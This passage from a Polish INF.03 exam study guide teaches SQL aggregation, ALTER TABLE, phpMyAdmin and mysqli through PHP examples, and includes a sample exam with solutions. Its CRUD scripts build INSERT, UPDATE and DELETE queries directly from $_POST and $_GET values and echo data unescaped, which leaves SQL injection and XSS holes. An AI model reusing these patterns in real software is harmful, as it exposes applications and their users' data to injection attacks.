#### **Podstawowe GROUP BY**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    mysqli_set_charset($conn, "utf8");
    
    // Policz ile produktów w każdej kategorii
    $sql = "SELECT kategoria, COUNT(*) as ilosc 
            FROM produkty 
            GROUP BY kategoria";
    
    $wynik = mysqli_query($conn, $sql);
    
    echo "<h3>Produkty w kategoriach:</h3>";
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["kategoria"] . ": " . $wiersz["ilosc"] . " produktów<br>";
    }
    
    mysqli_close($conn);
?>
```

**Wynik przykładowy:**
```
Elektronika: 15 produktów
Książki: 23 produkty
Ubrania: 45 produktów
```

#### **GROUP BY z SUM - suma dla grup**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Suma sprzedaży dla każdego produktu
    $sql = "SELECT produkt, SUM(ilosc) as suma_sprzedanych 
            FROM zamowienia 
            GROUP BY produkt 
            ORDER BY suma_sprzedanych DESC";
    
    $wynik = mysqli_query($conn, $sql);
    
    echo "<h3>Bestsellery:</h3>";
    echo "<ol>";
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo "<li>" . $wiersz["produkt"] . " - sprzedano: " . $wiersz["suma_sprzedanych"] . " szt.</li>";
    }
    echo "</ol>";
    
    mysqli_close($conn);
?>
```

#### **GROUP BY z AVG - średnia dla grup**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Średnia cena w każdej kategorii
    $sql = "SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc 
            FROM produkty 
            GROUP BY kategoria";
    
    $wynik = mysqli_query($conn, $sql);
    
    echo "<table border='1'>";
    echo "<tr><th>Kategoria</th><th>Średnia cena</th><th>Liczba produktów</th></tr>";
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo "<tr>";
        echo "<td>" . $wiersz["kategoria"] . "</td>";
        echo "<td>" . round($wiersz["srednia_cena"], 2) . " zł</td>";
        echo "<td>" . $wiersz["ilosc"] . "</td>";
        echo "</tr>";
    }
    
    echo "</table>";
    
    mysqli_close($conn);
?>
```

#### **GROUP BY z wieloma kolumnami**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Sprzedaż według miesiąca i produktu
    $sql = "SELECT MONTH(data_zamowienia) as miesiac, produkt, SUM(ilosc) as suma 
            FROM zamowienia 
            GROUP BY MONTH(data_zamowienia), produkt 
            ORDER BY miesiac, suma DESC";
    
    $wynik = mysqli_query($conn, $sql);
    
    $aktualnyMiesiac = 0;
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        if ($aktualnyMiesiac != $wiersz["miesiac"]) {
            $aktualnyMiesiac = $wiersz["miesiac"];
            echo "<h4>Miesiąc: $aktualnyMiesiac</h4>";
        }
        echo $wiersz["produkt"] . " - " . $wiersz["suma"] . " szt.<br>";
    }
    
    mysqli_close($conn);
?>
```

### **HAVING - filtrowanie po agregacji (EGZAMIN!)**

HAVING działa jak WHERE, ale dla wyników GROUP BY:

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Pokaż tylko kategorie z więcej niż 10 produktami
    $sql = "SELECT kategoria, COUNT(*) as ilosc 
            FROM produkty 
            GROUP BY kategoria 
            HAVING ilosc > 10";
    
    $wynik = mysqli_query($conn, $sql);
    
    echo "<h3>Popularne kategorie (>10 produktów):</h3>";
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["kategoria"] . ": " . $wiersz["ilosc"] . " produktów<br>";
    }
    
    mysqli_close($conn);
?>
```

**Różnica WHERE vs HAVING:**

```php
<?php
    // WHERE - filtruje PRZED grupowaniem
    $sql = "SELECT kategoria, COUNT(*) as ilosc 
            FROM produkty 
            WHERE cena > 100
            GROUP BY kategoria";
    // Najpierw bierze produkty droższe niż 100zł, potem grupuje
    
    // HAVING - filtruje PO grupowaniu
    $sql = "SELECT kategoria, COUNT(*) as ilosc 
            FROM produkty 
            GROUP BY kategoria 
            HAVING ilosc > 5";
    // Najpierw grupuje, potem pokazuje tylko grupy z >5 produktami
?>
```

### **ALTER TABLE - modyfikacja struktury tabeli (EGZAMIN!)**

Na egzaminie często trzeba modyfikować strukturę istniejącej tabeli!

#### **Dodawanie kolumny**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Dodaj kolumnę "opis" do tabeli produkty
    $sql = "ALTER TABLE produkty ADD opis TEXT";
    
    if (mysqli_query($conn, $sql)) {
        echo "Kolumna 'opis' dodana pomyślnie";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
?>
```

#### **Usuwanie kolumny**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Usuń kolumnę "stary_kod" z tabeli produkty
    $sql = "ALTER TABLE produkty DROP COLUMN stary_kod";
    
    if (mysqli_query($conn, $sql)) {
        echo "Kolumna usunięta";
    }
    
    mysqli_close($conn);
?>
```

#### **Zmiana typu kolumny**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Zmień typ kolumny "kod_pocztowy" z INT na VARCHAR(6)
    $sql = "ALTER TABLE adresy MODIFY kod_pocztowy VARCHAR(6)";
    
    if (mysqli_query($conn, $sql)) {
        echo "Typ kolumny zmieniony";
    }
    
    mysqli_close($conn);
?>
```

#### **Zmiana nazwy kolumny**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Zmień nazwę kolumny z "imie_nazwisko" na "pelne_imie"
    $sql = "ALTER TABLE uzytkownicy CHANGE imie_nazwisko pelne_imie VARCHAR(100)";
    
    if (mysqli_query($conn, $sql)) {
        echo "Nazwa kolumny zmieniona";
    }
    
    mysqli_close($conn);
?>
```

### **phpMyAdmin - BARDZO WAŻNE NA EGZAMINIE!**

Na egzaminie często musisz wykonać zapytania w phpMyAdmin i zapisać wyniki!

#### **Jak pracować w phpMyAdmin:**

1. **Otwórz phpMyAdmin:**
   - Adres: `localhost/phpmyadmin`
   - Zaloguj się (domyślnie użytkownik: `root`, hasło: puste)

2. **Wybierz bazę danych:**
   - Kliknij nazwę bazy w lewym menu

3. **Wykonaj zapytanie SQL:**
   - Zakładka **"SQL"** u góry
   - Wpisz zapytanie
   - Kliknij **"Wykonaj"** (Go)

4. **Zapisz wynik do pliku (OBOWIĄZKOWO NA EGZAMINIE!):**
   - Po wykonaniu zapytania **zrób zrzut ekranu** (Print Screen)
   - Zapisz jako PNG lub JPG
   - Nazwa pliku: `kwerenda1.png`, `kwerenda2.png` itd.

#### **Zapisywanie kwerend do pliku kwerendy.txt (EGZAMIN!)**

Na egzaminie MUSISZ zapisać wszystkie zapytania SQL do pliku `kwerendy.txt`!

**Przykład zawartości pliku kwerendy.txt:**

```
# Zadanie 4.1 - Wybierz wszystkie produkty droższe niż 100 zł
SELECT * FROM produkty WHERE cena > 100;

# Zadanie 4.2 - Dodaj nową kategorię "Sport"
INSERT INTO kategorie (nazwa) VALUES ('Sport');

# Zadanie 4.3 - Zaktualizuj cenę produktu o ID=5
UPDATE produkty SET cena = 149.99 WHERE id = 5;

# Zadanie 4.4 - Usuń produkty ze stanem magazynowym = 0
DELETE FROM produkty WHERE stan = 0;
```

**Jak to zrobić w PHP (automatycznie):**

```php
<?php
    // Funkcja zapisująca kwerendę do pliku
    function zapiszKwerende($numer, $opis, $sql) {
        $plik = "kwerendy.txt";
        $tekst = "# Zadanie $numer - $opis\n";
        $tekst .= "$sql\n\n";
        file_put_contents($plik, $tekst, FILE_APPEND);
    }
    
    // Przykład użycia
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    $sql = "SELECT * FROM produkty WHERE cena > 100";
    zapiszKwerende("4.1", "Produkty droższe niż 100 zł", $sql);
    
    $wynik = mysqli_query($conn, $sql);
    // ... wyświetlanie wyników ...
    
    mysqli_close($conn);
?>
```

### **Tabela funkcji mysqli - DO ZAPAMIĘTANIA NA EGZAMIN!**

| Funkcja | Co robi | Przykład |
|---------|---------|----------|
| `mysqli_connect()` | Łączy z bazą | `mysqli_connect("localhost", "root", "", "baza")` |
| `mysqli_select_db()` | Wybiera bazę danych | `mysqli_select_db($conn, "nazwa_bazy")` |
| `mysqli_query()` | Wykonuje zapytanie SQL | `mysqli_query($conn, $sql)` |
| `mysqli_fetch_array()` | Pobiera wiersz jako tablicę | `mysqli_fetch_array($wynik)` |
| `mysqli_fetch_row()` | Pobiera wiersz jako tablicę numeryczną | `mysqli_fetch_row($wynik)` |
| `mysqli_num_rows()` | Zwraca liczbę wierszy | `mysqli_num_rows($wynik)` |
| `mysqli_num_fields()` | Zwraca liczbę kolumn | `mysqli_num_fields($wynik)` |
| `mysqli_affected_rows()` | Liczba zmienionych wierszy | `mysqli_affected_rows($conn)` |
| `mysqli_insert_id()` | ID ostatnio dodanego rekordu | `mysqli_insert_id($conn)` |
| `mysqli_close()` | Zamyka połączenie | `mysqli_close($conn)` |
| `mysqli_error()` | Zwraca tekst błędu | `mysqli_error($conn)` |
| `mysqli_set_charset()` | Ustawia kodowanie | `mysqli_set_charset($conn, "utf8")` |
| `mysqli_real_escape_string()` | Zabezpiecza przed SQL Injection | `mysqli_real_escape_string($conn, $tekst)` |

**⚠️ UWAGA:** Zgodnie z oficjalną dokumentacją CKE dla egzaminu INF.03, powyższe funkcje są PODSTAWĄ! Musisz je znać na pamięć!

### **Przykłady użycia funkcji mysqli (z oficjalnego informatora CKE)**

#### **mysqli_select_db() - zmiana bazy danych**

```php
<?php
    // Połączenie BEZ wyboru bazy
    $conn = mysqli_connect("localhost", "root", "");
    
    if (!$conn) {
        die("Błąd połączenia: " . mysqli_connect_error());
    }
    
    // Wybór bazy danych
    if (mysqli_select_db($conn, "sklep")) {
        echo "Wybrano bazę 'sklep'<br>";
    } else {
        die("Błąd wyboru bazy: " . mysqli_error($conn));
    }
    
    // Teraz możemy wykonywać zapytania
    $sql = "SELECT * FROM produkty";
    $wynik = mysqli_query($conn, $sql);
    
    mysqli_close($conn);
?>
```

**Kiedy używać?**
- Gdy łączysz się bez podania nazwy bazy w `mysqli_connect()`
- Gdy chcesz przełączyć się na inną bazę danych w trakcie działania skryptu

#### **mysqli_fetch_row() - pobieranie jako tablica numeryczna**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    mysqli_set_charset($conn, "utf8");
    
    $sql = "SELECT nazwa, cena, ilosc FROM produkty WHERE cena < 50";
    $wynik = mysqli_query($conn, $sql);
    
    echo "<h3>Tanie produkty:</h3>";
    
    // mysqli_fetch_row() - zwraca tablicę numeryczną [0], [1], [2]...
    while ($wiersz = mysqli_fetch_row($wynik)) {
        echo "Produkt: " . $wiersz[0] . " | ";  // nazwa (pierwsza kolumna)
        echo "Cena: " . $wiersz[1] . " zł | ";  // cena (druga kolumna)
        echo "Ilość: " . $wiersz[2] . " szt<br>"; // ilosc (trzecia kolumna)
    }
    
    mysqli_close($conn);
?>
```

**Różnica między mysqli_fetch_array() a mysqli_fetch_row():**

| Funkcja | Dostęp do danych | Przykład |
|---------|------------------|----------|
| `mysqli_fetch_array()` | Po nazwie kolumny LUB indeksie | `$wiersz["nazwa"]` lub `$wiersz[0]` |
| `mysqli_fetch_row()` | TYLKO po indeksie | `$wiersz[0]`, `$wiersz[1]`, ... |

**Na egzaminie:** Używaj `mysqli_fetch_array()` - jest bardziej czytelna i bezpieczniejsza!

#### **mysqli_num_fields() - liczba kolumn w wyniku**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    mysqli_set_charset($conn, "utf8");
    
    $sql = "SELECT id, nazwa, cena, kategoria FROM produkty";
    $wynik = mysqli_query($conn, $sql);
    
    // Sprawdzenie liczby kolumn
    $liczba_kolumn = mysqli_num_fields($wynik);
    echo "Zapytanie zwraca $liczba_kolumn kolumn<br><br>";
    // Wyświetli: "Zapytanie zwraca 4 kolumn"
    
    // Sprawdzenie liczby wierszy
    $liczba_wierszy = mysqli_num_rows($wynik);
    echo "Znaleziono $liczba_wierszy produktów<br><br>";
    
    // Wyświetlanie danych
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["nazwa"] . " - " . $wiersz["cena"] . " zł<br>";
    }
    
    mysqli_close($conn);
?>
```

**Kiedy używać mysqli_num_fields()?**
- Gdy chcesz sprawdzić ile kolumn zwróciło zapytanie
- Przydatne przy dynamicznym generowaniu tabel HTML
- Rzadko spotykane na egzaminie INF.03, ale jest w oficjalnej dokumentacji CKE

**Przykład - dynamiczne tworzenie tabeli HTML:**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    mysqli_set_charset($conn, "utf8");
    
    $sql = "SELECT * FROM produkty LIMIT 10";
    $wynik = mysqli_query($conn, $sql);
    
    echo "<table border='1'>";
    echo "<tr>";
    
    // Automatyczne tworzenie nagłówków tabeli
    $liczba_kolumn = mysqli_num_fields($wynik);
    for ($i = 0; $i < $liczba_kolumn; $i++) {
        echo "<th>Kolumna " . ($i + 1) . "</th>";
    }
    echo "</tr>";
    
    // Wyświetlanie wierszy
    while ($wiersz = mysqli_fetch_row($wynik)) {
        echo "<tr>";
        for ($i = 0; $i < $liczba_kolumn; $i++) {
            echo "<td>" . htmlspecialchars($wiersz[$i]) . "</td>";
        }
        echo "</tr>";
    }
    
    echo "</table>";
    
    mysqli_close($conn);
?>
```

### **Dodatkowe klauzule SQL (na egzaminie!)**

#### **DISTINCT - unikalne wartości**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Pobierz wszystkie unikalne miasta klientów
    $sql = "SELECT DISTINCT miasto FROM klienci ORDER BY miasto";
    $wynik = mysqli_query($conn, $sql);
    
    echo "<h3>Lista miast:</h3>";
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["miasto"] . "<br>";
    }
    
    mysqli_close($conn);
?>
```

**Bez DISTINCT:**
```
Warszawa
Kraków
Warszawa
Gdańsk
Kraków
```

**Z DISTINCT:**
```
Gdańsk
Kraków
Warszawa
```

#### **UNION - łączenie wyników zapytań**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Połącz listę klientów i dostawców w jedną listę
    $sql = "(SELECT imie, nazwisko, 'Klient' as typ FROM klienci)
            UNION
            (SELECT imie, nazwisko, 'Dostawca' as typ FROM dostawcy)
            ORDER BY nazwisko";
    
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"] . " " . $wiersz["nazwisko"] . " (" . $wiersz["typ"] . ")<br>";
    }
    
    mysqli_close($conn);
?>
```

#### **BETWEEN - zakres wartości**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Produkty w przedziale cenowym 50-150 zł
    $sql = "SELECT nazwa, cena FROM produkty WHERE cena BETWEEN 50 AND 150";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["nazwa"] . " - " . $wiersz["cena"] . " zł<br>";
    }
    
    mysqli_close($conn);
?>
```

#### **IN - wartość z listy**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Produkty z wybranych kategorii
    $sql = "SELECT * FROM produkty WHERE kategoria IN ('elektronika', 'AGD', 'RTV')";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["nazwa"] . "<br>";
    }
    
    mysqli_close($conn);
?>
```

### **Praktyczny przykład - kompletny system CRUD (styl proceduralny)**

#### **Struktura bazy danych**

Najpierw stwórz bazę w phpMyAdmin:

```sql
CREATE DATABASE sklep;
USE sklep;

CREATE TABLE produkty (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nazwa VARCHAR(100) NOT NULL,
    cena DECIMAL(10,2) NOT NULL,
    ilosc INT NOT NULL,
    data_dodania TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

#### **1. Dodawanie produktu (INSERT)**

**dodaj_produkt.php:**
```php
<!DOCTYPE html>
<html>
<head>
    <title>Dodaj produkt</title>
</head>
<body>
    <h2>Dodaj nowy produkt</h2>
    
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Połączenie z bazą
        $conn = mysqli_connect("localhost", "root", "", "sklep");
        
        if (!$conn) {
            die("Błąd połączenia: " . mysqli_connect_error());
        }
        
        mysqli_set_charset($conn, "utf8");
        
        // Odbieranie danych z formularza
        $nazwa = $_POST["nazwa"];
        $cena = $_POST["cena"];
        $ilosc = $_POST["ilosc"];
        
        // Zapytanie INSERT
        $sql = "INSERT INTO produkty (nazwa, cena, ilosc) 
                VALUES ('$nazwa', $cena, $ilosc)";
        
        if (mysqli_query($conn, $sql)) {
            echo "<p style='color:green'>✅ Produkt dodany pomyślnie!</p>";
        } else {
            echo "<p style='color:red'>❌ Błąd: " . mysqli_error($conn) . "</p>";
        }
        
        mysqli_close($conn);
    }
    ?>
    
    <form method="POST">
        <label>Nazwa produktu:</label><br>
        <input type="text" name="nazwa" required><br><br>
        
        <label>Cena (zł):</label><br>
        <input type="number" step="0.01" name="cena" required><br><br>
        
        <label>Ilość:</label><br>
        <input type="number" name="ilosc" required><br><br>
        
        <button type="submit">Dodaj produkt</button>
    </form>
    
    <br>
    <a href="lista_produktow.php">Pokaż wszystkie produkty</a>
</body>
</html>
```

#### **2. Wyświetlanie produktów (SELECT)**

**lista_produktow.php:**
```php
<!DOCTYPE html>
<html>
<head>
    <title>Lista produktów</title>
    <style>
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        tr:hover { background-color: #f5f5f5; }
    </style>
</head>
<body>
    <h2>Lista produktów w sklepie</h2>
    
    <?php
    // Połączenie z bazą
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    if (!$conn) {
        die("Błąd połączenia: " . mysqli_connect_error());
    }
    
    mysqli_set_charset($conn, "utf8");
    
    // Zapytanie SELECT
    $sql = "SELECT * FROM produkty ORDER BY id DESC";
    $wynik = mysqli_query($conn, $sql);
    
    // Sprawdzenie czy są wyniki
    if (mysqli_num_rows($wynik) > 0) {
        echo "<p>Liczba produktów: " . mysqli_num_rows($wynik) . "</p>";
        
        echo "<table>";
        echo "<tr>";
        echo "<th>ID</th>";
        echo "<th>Nazwa</th>";
        echo "<th>Cena</th>";
        echo "<th>Ilość</th>";
        echo "<th>Data dodania</th>";
        echo "<th>Akcje</th>";
        echo "</tr>";
        
        // Pętla WHILE - pobieranie każdego wiersza
        while ($produkt = mysqli_fetch_array($wynik)) {
            echo "<tr>";
            echo "<td>" . $produkt["id"] . "</td>";
            echo "<td>" . $produkt["nazwa"] . "</td>";
            echo "<td>" . $produkt["cena"] . " zł</td>";
            echo "<td>" . $produkt["ilosc"] . " szt.</td>";
            echo "<td>" . $produkt["data_dodania"] . "</td>";
            echo "<td>";
            echo "<a href='edytuj_produkt.php?id=" . $produkt["id"] . "'>Edytuj</a> | ";
            echo "<a href='usun_produkt.php?id=" . $produkt["id"] . "' 
                     onclick='return confirm(\"Czy na pewno usunąć?\")'>Usuń</a>";
            echo "</td>";
            echo "</tr>";
        }
        
        echo "</table>";
    } else {
        echo "<p>Brak produktów w bazie danych</p>";
    }
    
    mysqli_close($conn);
    ?>
    
    <br>
    <a href="dodaj_produkt.php">Dodaj nowy produkt</a>
</body>
</html>
```

#### **3. Edycja produktu (UPDATE)**

**edytuj_produkt.php:**
```php
<?php
$conn = mysqli_connect("localhost", "root", "", "sklep");
mysqli_set_charset($conn, "utf8");

// Pobierz ID produktu z URL
$id = $_GET["id"];

// Jeśli formularz wysłany - zaktualizuj dane
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nazwa = $_POST["nazwa"];
    $cena = $_POST["cena"];
    $ilosc = $_POST["ilosc"];
    
    $sql = "UPDATE produkty SET nazwa='$nazwa', cena=$cena, ilosc=$ilosc WHERE id=$id";
    
    if (mysqli_query($conn, $sql)) {
        echo "✅ Produkt zaktualizowany!<br>";
        $zmienione = mysqli_affected_rows($conn);
        echo "Liczba zaktualizowanych wierszy: $zmienione<br>";
    } else {
        echo "❌ Błąd: " . mysqli_error($conn);
    }
}

// Pobierz aktualne dane produktu
$sql = "SELECT * FROM produkty WHERE id=$id";
$wynik = mysqli_query($conn, $sql);
$produkt = mysqli_fetch_array($wynik);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Edytuj produkt</title>
</head>
<body>
    <h2>Edytuj produkt</h2>
    
    <form method="POST">
        <label>Nazwa:</label><br>
        <input type="text" name="nazwa" value="<?php echo $produkt['nazwa']; ?>" required><br><br>
        
        <label>Cena:</label><br>
        <input type="number" step="0.01" name="cena" value="<?php echo $produkt['cena']; ?>" required><br><br>
        
        <label>Ilość:</label><br>
        <input type="number" name="ilosc" value="<?php echo $produkt['ilosc']; ?>" required><br><br>
        
        <button type="submit">Zapisz zmiany</button>
    </form>
    
    <br>
    <a href="lista_produktow.php">Powrót do listy</a>
    
    <?php mysqli_close($conn); ?>
</body>
</html>
```

#### **4. Usuwanie produktu (DELETE)**

**usun_produkt.php:**
```php
<?php
// Połączenie z bazą
$conn = mysqli_connect("localhost", "root", "", "sklep");
mysqli_set_charset($conn, "utf8");

// Pobierz ID z URL
$id = $_GET["id"];

// Usuń produkt
$sql = "DELETE FROM produkty WHERE id=$id";

if (mysqli_query($conn, $sql)) {
    $usuniete = mysqli_affected_rows($conn);
    
    if ($usuniete > 0) {
        echo "✅ Produkt usunięty pomyślnie!<br>";
        echo "Liczba usuniętych wierszy: $usuniete";
    } else {
        echo "⚠️ Nie znaleziono produktu o ID: $id";
    }
} else {
    echo "❌ Błąd: " . mysqli_error($conn);
}

mysqli_close($conn);
?>

<br><br>
<a href="lista_produktow.php">Powrót do listy produktów</a>
```

### **Przykład z JOIN - zamówienia i klienci**

Załóżmy że mamy dwie tabele:

```sql
CREATE TABLE klienci (
    id INT AUTO_INCREMENT PRIMARY KEY,
    imie VARCHAR(50),
    email VARCHAR(100)
);

CREATE TABLE zamowienia (
    id INT AUTO_INCREMENT PRIMARY KEY,
    klient_id INT,
    produkt VARCHAR(100),
    cena DECIMAL(10,2),
    data_zamowienia TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

**Wyświetlanie zamówień z danymi klientów:**

```php
<?php
$conn = mysqli_connect("localhost", "root", "", "sklep");
mysqli_set_charset($conn, "utf8");

// JOIN - połączenie tabel
$sql = "SELECT klienci.imie, klienci.email, 
               zamowienia.produkt, zamowienia.cena, zamowienia.data_zamowienia
        FROM zamowienia
        INNER JOIN klienci ON zamowienia.klient_id = klienci.id
        ORDER BY zamowienia.data_zamowienia DESC";

$wynik = mysqli_query($conn, $sql);

echo "<h2>Historia zamówień</h2>";
echo "<table border='1'>";
echo "<tr><th>Klient</th><th>Email</th><th>Produkt</th><th>Cena</th><th>Data</th></tr>";

while ($zamowienie = mysqli_fetch_array($wynik)) {
    echo "<tr>";
    echo "<td>" . $zamowienie["imie"] . "</td>";
    echo "<td>" . $zamowienie["email"] . "</td>";
    echo "<td>" . $zamowienie["produkt"] . "</td>";
    echo "<td>" . $zamowienie["cena"] . " zł</td>";
    echo "<td>" . $zamowienie["data_zamowienia"] . "</td>";
    echo "</tr>";
}

echo "</table>";

mysqli_close($conn);
?>
```

---

## **11b. PRZYKŁADOWE ZADANIE EGZAMINACYJNE INF.03 (JAK WYGLĄDA PRAWDZIWY EGZAMIN)**

### **Struktura zadania egzaminacyjnego**

Egzamin INF.03 trwa **150 minut** i składa się z kilku części:

**1. Operacje na bazie danych (phpMyAdmin) - ~30 pkt**
- 4-5 zapytań SQL do wykonania
- INSERT, UPDATE, DELETE, SELECT
- Często z JOIN, GROUP BY, funkcjami agregującymi
- MUSISZ zapisać wyniki do pliku `kwerendy.txt` + zrzuty ekranu

**2. Strona internetowa (HTML + CSS + PHP) - ~50 pkt**
- Struktura HTML5 (header, nav, section, footer)
- Formularz z polami różnych typów
- Stylizacja CSS (zewnętrzny plik)
- Skrypty PHP łączące się z bazą
- Wyświetlanie danych w tabelach

**3. Grafika (GIMP/Photoshop) - ~20 pkt**
- Przeskalowanie obrazu
- Odbicie lustrzane
- Dodanie tekstu/logo
- Zmiana formatu

### **Przykład zadania - Portal firmowy**

**Zadanie 4** - *Na podstawie udostępnionej bazy danych i materiałów wykonaj portal firmowy.*

#### **Część 1: Operacje w bazie danych (phpMyAdmin)**

**Baza danych:** `firma.sql` (import do phpMyAdmin)

**Tabele:**
- `pracownicy` (id, imie, nazwisko, stanowisko, pensja, data_zatrudnienia)
- `projekty` (id, nazwa, budzet, data_rozpoczecia, pracownik_id)

**Zadanie 4.1** *(8 pkt)* Napisz i wykonaj zapytanie SQL, które wyświetli imię, nazwisko i stanowisko wszystkich pracowników zatrudnionych po 2020 roku, posortowanych alfabetycznie według nazwiska.

**Rozwiązanie:**
```sql
SELECT imie, nazwisko, stanowisko 
FROM pracownicy 
WHERE YEAR(data_zatrudnienia) > 2020 
ORDER BY nazwisko ASC;
```

**Zadanie 4.2** *(8 pkt)* Napisz i wykonaj zapytanie SQL, które policzy ile projektów prowadzi każdy pracownik. Wyświetl imię, nazwisko pracownika oraz liczbę projektów. Pokaż tylko pracowników z więcej niż 2 projektami.

**Rozwiązanie:**
```sql
SELECT pracownicy.imie, pracownicy.nazwisko, COUNT(projekty.id) as liczba_projektow
FROM pracownicy
INNER JOIN projekty ON pracownicy.id = projekty.pracownik_id
GROUP BY pracownicy.id
HAVING liczba_projektow > 2;
```

**Zadanie 4.3** *(6 pkt)* Dodaj nowy projekt o nazwie "Portal E-commerce", budżecie 150000 zł, przypisany do pracownika o ID=3.

**Rozwiązanie:**
```sql
INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
VALUES ('Portal E-commerce', 150000, CURRENT_DATE(), 3);
```

**Zadanie 4.4** *(8 pkt)* Zaktualizuj pensję wszystkich programistów, zwiększając ją o 10%.

**Rozwiązanie:**
```sql
UPDATE pracownicy 
SET pensja = pensja * 1.10 
WHERE stanowisko = 'programista';
```

**⚠️ WAŻNE - MUSISZ:**
1. Wykonać każde zapytanie w phpMyAdmin
2. Zrobić **zrzut ekranu** wyniku (nazwa: `kwerenda1.png`, `kwerenda2.png`, etc.)
3. Zapisać wszystkie zapytania do pliku **`kwerendy.txt`**

**Plik kwerendy.txt:**
```
-- Zadanie 4.1
SELECT imie, nazwisko, stanowisko 
FROM pracownicy 
WHERE YEAR(data_zatrudnienia) > 2020 
ORDER BY nazwisko ASC;

-- Zadanie 4.2
SELECT pracownicy.imie, pracownicy.nazwisko, COUNT(projekty.id) as liczba_projektow
FROM pracownicy
INNER JOIN projekty ON pracownicy.id = projekty.pracownik_id
GROUP BY pracownicy.id
HAVING liczba_projektow > 2;

-- Zadanie 4.3
INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
VALUES ('Portal E-commerce', 150000, CURRENT_DATE(), 3);

-- Zadanie 4.4
UPDATE pracownicy 
SET pensja = pensja * 1.10 
WHERE stanowisko = 'programista';
```

#### **Część 2: Strona internetowa**

**Zadanie 4.5** *(20 pkt)* Stwórz stronę `index.php` zawierającą:
- Nagłówek z logo firmy
- Formularz dodawania nowego projektu (nazwa, budżet, wybór pracownika z listy)
- Tabelę wyświetlającą wszystkie projekty z danymi pracowników

**index.php:**
```php
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Portal Firmowy</title>
    <link rel="stylesheet" href="styl.css">
</head>
<body>
    <header>
        <img src="logo.png" alt="Logo">
        <h1>Portal Zarządzania Projektami</h1>
    </header>
    
    <section id="formularz">
        <h2>Dodaj nowy projekt</h2>
        <form method="POST" action="dodaj.php">
            <label>Nazwa projektu:</label>
            <input type="text" name="nazwa" required><br>
            
            <label>Budżet (zł):</label>
            <input type="number" name="budzet" required><br>
            
            <label>Pracownik odpowiedzialny:</label>
            <select name="pracownik_id" required>
                <?php
                $conn = mysqli_connect("localhost", "root", "", "firma");
                $sql = "SELECT id, imie, nazwisko FROM pracownicy";
                $wynik = mysqli_query($conn, $sql);
                
                while ($pracownik = mysqli_fetch_array($wynik)) {
                    echo "<option value='" . $pracownik["id"] . "'>";
                    echo $pracownik["imie"] . " " . $pracownik["nazwisko"];
                    echo "</option>";
                }
                
                mysqli_close($conn);
                ?>
            </select><br>
            
            <button type="submit">Dodaj projekt</button>
        </form>
    </section>
    
    <section id="lista">
        <h2>Lista projektów</h2>
        
        <?php
        $conn = mysqli_connect("localhost", "root", "", "firma");
        mysqli_set_charset($conn, "utf8");
        
        $sql = "SELECT projekty.nazwa, projekty.budzet, projekty.data_rozpoczecia,
                       pracownicy.imie, pracownicy.nazwisko
                FROM projekty
                INNER JOIN pracownicy ON projekty.pracownik_id = pracownicy.id
                ORDER BY projekty.data_rozpoczecia DESC";
        
        $wynik = mysqli_query($conn, $sql);
        
        if (mysqli_num_rows($wynik) > 0) {
            echo "<table>";
            echo "<tr>";
            echo "<th>Nazwa projektu</th>";
            echo "<th>Budżet</th>";
            echo "<th>Data rozpoczęcia</th>";
            echo "<th>Pracownik</th>";
            echo "</tr>";
            
            while ($projekt = mysqli_fetch_array($wynik)) {
                echo "<tr>";
                echo "<td>" . $projekt["nazwa"] . "</td>";
                echo "<td>" . number_format($projekt["budzet"], 2, ',', ' ') . " zł</td>";
                echo "<td>" . $projekt["data_rozpoczecia"] . "</td>";
                echo "<td>" . $projekt["imie"] . " " . $projekt["nazwisko"] . "</td>";
                echo "</tr>";
            }
            
            echo "</table>";
        } else {
            echo "<p>Brak projektów w bazie</p>";
        }
        
        mysqli_close($conn);
        ?>
    </section>
    
